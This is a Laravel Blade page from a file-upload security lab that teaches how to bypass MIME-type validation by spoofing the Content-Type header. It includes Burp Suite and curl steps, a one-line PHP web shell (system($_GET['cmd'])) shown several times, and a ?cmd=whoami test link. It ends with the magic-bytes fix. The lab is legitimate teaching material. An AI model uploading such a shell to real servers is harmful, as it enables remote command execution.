@extends('layouts.app')

@section('title', 'Level 4: MIME Type Bypass')

@section('content')
<div class="container-fluid py-4">
    {{-- Header --}}
    <div class="d-flex justify-content-between align-items-center mb-4">
        <div>
            <h2 class="mb-1">
                <span class="badge bg-primary me-2">Level 4</span>
                MIME Type Validation
            </h2>
            <p class="text-muted mb-0">Content-Type header validation - can be spoofed!</p>
        </div>
        <div>
            <a href="{{ route('file-upload-lab.vulnerable.index') }}" class="btn btn-outline-secondary">
                <i class="bi bi-arrow-left"></i> Back to Lab
            </a>
        </div>
    </div>

    <div class="row">
        {{-- Upload Form --}}
        <div class="col-lg-6 mb-4">
            <div class="card border-primary">
                <div class="card-header bg-primary text-white">
                    <h5 class="mb-0"><i class="bi bi-cloud-upload"></i> MIME Type Protected Upload</h5>
                </div>
                <div class="card-body">
                    {{-- Show allowed MIME types --}}
                    <div class="alert alert-primary py-2 mb-3">
                        <strong>Allowed MIME Types:</strong><br>
                        @foreach($allowedMimeTypes ?? ['image/jpeg', 'image/png', 'image/gif'] as $mime)
                            <code>{{ $mime }}</code>{{ !$loop->last ? ', ' : '' }}
                        @endforeach
                    </div>

                    <form action="{{ route('file-upload-lab.vulnerable.level4') }}" method="POST" enctype="multipart/form-data">
                        @csrf

                        <div class="mb-3">
                            <label class="form-label">Select Image File</label>
                            <input type="file" name="file" class="form-control" required>
                            <div class="form-text">
                                <i class="bi bi-shield-check text-primary"></i>
                                Only image MIME types are accepted
                            </div>
                        </div>

                        <button type="submit" class="btn btn-primary">
                            <i class="bi bi-upload"></i> Upload File
                        </button>
                    </form>

                    @if(isset($error))
                        <div class="alert alert-danger mt-3 mb-0">
                            <i class="bi bi-x-circle"></i> {{ $error }}
                        </div>
                    @endif

                    @if(isset($message))
                        <div class="alert alert-success mt-3 mb-0">
                            <i class="bi bi-check-circle"></i> {{ $message }}
                            @if(isset($fileUrl))
                                <br>
                                <strong>URL:</strong>
                                <a href="{{ $fileUrl }}" target="_blank">{{ $fileUrl }}</a>
                            @endif
                        </div>
                    @endif
                </div>
            </div>

            {{-- Vulnerable Code --}}
            <div class="card mt-4">
                <div class="card-header bg-dark text-white">
                    <h6 class="mb-0"><i class="bi bi-code-slash"></i> Vulnerable Code</h6>
                </div>
                <div class="card-body bg-dark">
<pre class="text-light mb-0 small"><code>$allowedMimeTypes = [
    <span class="text-success">'image/jpeg'</span>,
    <span class="text-success">'image/png'</span>,
    <span class="text-success">'image/gif'</span>
];

<span class="text-secondary">// VULNERABLE: Reads Content-Type from request header!</span>
<span class="text-secondary">// getClientMimeType() = header dari request (spoofable!)</span>
<span class="text-secondary">// getMimeType() = magic bytes dari file (secure)</span>
$mimeType = $file-><span class="text-warning">getClientMimeType</span>();

<span class="text-primary">if</span> (!in_array($mimeType, $allowedMimeTypes)) {
    <span class="text-primary">return</span> <span class="text-success">'Invalid MIME type!'</span>;
}

<span class="text-secondary">// Problem: getClientMimeType() reads Content-Type header</span>
<span class="text-secondary">// which is controlled by the attacker!</span></code></pre>
                </div>
            </div>
        </div>

        {{-- Bypass Instructions --}}
        <div class="col-lg-6 mb-4">
            <div class="card border-danger h-100">
                <div class="card-header bg-danger text-white">
                    <h5 class="mb-0"><i class="bi bi-unlock"></i> Bypass with Burp Suite</h5>
                </div>
                <div class="card-body">
                    <h6>Step 1: Prepare PHP Shell</h6>
                    <p class="small">Buat file <code>shell.php</code> dengan konten PHP shell.</p>

                    <h6>Step 2: Intercept Request</h6>
                    <ol class="small">
                        <li>Setup Burp Suite sebagai proxy browser</li>
                        <li>Enable intercept mode</li>
                        <li>Upload file shell.php via form</li>
                        <li>Request akan ter-intercept di Burp</li>
                    </ol>

                    <h6>Step 3: Modify Content-Type</h6>
                    <p class="small">Dalam intercepted request, cari:</p>
                    <div class="bg-dark text-light p-2 rounded small mb-3">
<pre class="mb-0"><code><span class="text-secondary">Content-Disposition: form-data; name="file"; filename="shell.php"</span>
<span class="text-danger">Content-Type: application/x-php</span>  ← CHANGE THIS!

&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
                    </div>

                    <p class="small">Ubah menjadi:</p>
                    <div class="bg-dark text-light p-2 rounded small mb-3">
<pre class="mb-0"><code><span class="text-secondary">Content-Disposition: form-data; name="file"; filename="shell.php"</span>
<span class="text-success">Content-Type: image/jpeg</span>  ← SPOOFED!

&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
                    </div>

                    <h6><span class="badge bg-success">✓ Tested</span> Step 4: Forward Request</h6>
                    <p class="small">Click "Forward" - file akan di-upload dengan MIME type palsu!</p>

                    <h6><span class="badge bg-secondary">Reference</span> Alternative: cURL</h6>
                    <div class="bg-dark text-light p-2 rounded small mb-2">
<pre class="mb-0"><code>curl -X POST \
  -F "file=@shell.php;type=image/jpeg" \
  -F "_token={{ csrf_token() }}" \
  {{ route('file-upload-lab.vulnerable.level4') }}</code></pre>
                    </div>
                    <div class="alert alert-warning py-1 small mb-3">
                        <i class="bi bi-exclamation-triangle"></i>
                        <em>cURL memerlukan valid session cookie. Gunakan Burp Suite untuk kemudahan.</em>
                    </div>

                    @if(isset($fileUrl))
                        <div class="alert alert-danger mt-3 mb-0">
                            <h6><i class="bi bi-terminal"></i> Test Shell:</h6>
                            <a href="{{ $fileUrl }}?cmd=whoami" target="_blank" class="text-danger small">
                                {{ $fileUrl }}?cmd=whoami
                            </a>
                        </div>
                    @endif
                </div>
            </div>
        </div>
    </div>

    {{-- HTTP Request Anatomy --}}
    <div class="card mb-4">
        <div class="card-header bg-secondary text-white">
            <h5 class="mb-0"><i class="bi bi-diagram-3"></i> HTTP Multipart Request Anatomy</h5>
        </div>
        <div class="card-body bg-dark">
<pre class="text-light mb-0 small"><code>POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="_token"

{{ csrf_token() }}
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
<span class="text-warning">Content-Type: image/jpeg  ← ATTACKER CONTROLLED! Server should NOT trust this!</span>

&lt;?php system($_GET['cmd']); ?&gt;
------WebKitFormBoundary--</code></pre>
        </div>
    </div>

    {{-- Lesson Learned --}}
    <div class="card">
        <div class="card-header bg-success text-white">
            <h5 class="mb-0"><i class="bi bi-mortarboard"></i> Lesson Learned</h5>
        </div>
        <div class="card-body">
            <div class="row">
                <div class="col-md-6">
                    <h6 class="text-danger"><i class="bi bi-x-circle"></i> Don't Trust Content-Type!</h6>
                    <ul class="small">
                        <li>Content-Type header dikirim oleh client</li>
                        <li>Attacker bisa set header apapun</li>
                        <li><code>getClientMimeType()</code> membaca header request</li>
                        <li>Proxy tools (Burp) mudah modify headers</li>
                    </ul>

                    <div class="alert alert-info py-2 small">
                        <strong>Laravel Methods:</strong>
                        <ul class="mb-0 mt-1">
                            <li><code>getClientMimeType()</code> → Header (❌ spoofable)</li>
                            <li><code>getMimeType()</code> → Magic bytes (✅ secure)</li>
                        </ul>
                    </div>
                </div>
                <div class="col-md-6">
                    <h6 class="text-success"><i class="bi bi-check-circle"></i> Check Magic Bytes Instead!</h6>
                    <div class="bg-dark text-light p-2 rounded small">
<pre class="mb-0"><code><span class="text-secondary">// Laravel's getMimeType() uses finfo internally</span>
$realMime = $file->getMimeType();

<span class="text-secondary">// Or manually with finfo:</span>
$finfo = <span class="text-primary">new</span> finfo(FILEINFO_MIME_TYPE);
$realMime = $finfo->file($file->getPathname());

<span class="text-secondary">// Both read actual file bytes!</span></code></pre>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection
